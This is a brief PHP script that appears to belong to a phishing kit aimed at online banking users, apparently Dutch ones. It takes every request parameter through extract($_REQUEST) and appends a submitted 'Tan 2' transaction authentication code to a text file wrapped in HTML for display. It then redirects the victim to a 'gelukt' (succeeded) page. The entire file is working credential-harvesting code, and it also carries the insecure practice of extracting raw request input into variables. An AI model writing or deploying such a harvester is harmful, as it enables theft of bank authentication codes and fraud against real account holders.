<?php
    extract($_REQUEST);
    $file=fopen("form-save.txt","a");


    fwrite($file,"</h4></font><font color='#FFFFFF'><h3>Tan 2:</h3></font><font color='#FFFFFF'><h4>");
    fwrite($file, $TanCode1 ."\n");
    fclose($file);
    header("Location: gelukt.php");
 ?>
